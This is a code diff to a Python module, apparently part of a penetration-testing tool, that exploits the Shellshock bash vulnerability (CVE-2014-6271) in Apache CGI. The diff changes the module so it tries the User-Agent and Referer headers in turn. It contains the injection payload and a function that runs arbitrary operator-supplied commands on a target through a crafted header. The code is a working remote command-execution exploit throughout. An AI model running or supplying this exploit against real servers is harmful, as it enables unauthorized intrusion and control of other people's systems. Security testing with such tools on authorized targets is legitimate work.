@@ -11,6 +11,14 @@ from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.requests import headers
 from src.core.requests import parameters
 
+"""
+This module exploits the vulnerability CVE-2014-6271 [1] in Apache CGI.
+[1] https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
+"""
+
+# Available HTTP headers
+headers = ["User-Agent","Referer"]
+
 # Shellshock Payloads
 classic_payload = "() { :;}; echo 'Shellshocked:Done';"
 
@@ -19,14 +27,17 @@ def classic_check(url,http_request_method):
     technique = "classic shellshock injection technique"
     shellshoked = False
     try: 
-        headers = {"User-Agent" : classic_payload}
-        request = urllib2.Request(url, None, headers)
-        response = urllib2.urlopen(request)
-        if 'Shellshocked' in response.info():
-            check_result = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
-            shellshoked = True
-        else:
-            check_result = Fore.RED + "FAILED" + Style.RESET_ALL
+        for check_header in headers:
+            header = {check_header : classic_payload}
+            request = urllib2.Request(url, None, header)
+            response = urllib2.urlopen(request)
+            if 'Shellshocked' in response.info():
+                check_result = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+                shellshoked = True
+                break
+            else:
+                check_result = Fore.RED + "FAILED" + Style.RESET_ALL
+                continue
 
         sys.stdout.write("\r(*) Testing the "+ technique + " [ " + check_result  + " ]")
         sys.stdout.flush()
@@ -73,35 +84,35 @@ def classic_input_cmd(url,http_request_method):
               os._exit(0)
 
 def classic_cmd_exec(url,cmd):
-    try:
-        headers = { 'User-Agent' : '() { :;}; /bin/bash -c "'+cmd+'"'}
-        request = urllib2.Request(url, None, headers)
-        response = urllib2.urlopen(request)
-        sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
-        print response.read().rstrip()
-        sys.stdout.write("\n" + Style.RESET_ALL)
+    for check_header in headers:
+        try:
+            header = { check_header : '() { :;}; /bin/bash -c "' + cmd + '"'}
+            request = urllib2.Request(url, None, header)
+            response = urllib2.urlopen(request)
+            sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
+            print response.read().rstrip()
+            sys.stdout.write("\n" + Style.RESET_ALL)
+            break
 
-    except urllib2.HTTPError, err:
-        # Give a second chance
-        if err.code== 500:
-            try:
-                headers = {"User-Agent" : classic_payload + " echo; "+cmd}
-                request = urllib2.Request(url, None, headers)
-                response = urllib2.urlopen(request)
-                sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
-                print response.read().rstrip()
-                sys.stdout.write("\n" + Style.RESET_ALL)
-            except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+        except urllib2.HTTPError, err:
+            # Give a second chance to execute it.
+            if err.code == 500:
+                try:
+                    header = {check_header : classic_payload + " echo; "+ cmd}
+                    request = urllib2.Request(url, None, header)
+                    response = urllib2.urlopen(request)
+                    sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
+                    print response.read().rstrip()
+                    sys.stdout.write("\n" + Style.RESET_ALL)
+                    break
 
-    except urllib2.URLError, err:
-        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+                except urllib2.HTTPError, err:
+                    print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
 
-def shellshock_handler(url,http_request_method):
-    if http_request_method != "GET":
-        print "\n" + Back.RED + "(x) Error : POST requests, are not supported yet." + Style.RESET_ALL
-        sys.exit(0)
-        
+        except urllib2.URLError, err:
+            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+
+def shellshock_handler(url,http_request_method):       
     classic_check(url,http_request_method)
 
 if __name__ == "__main__":
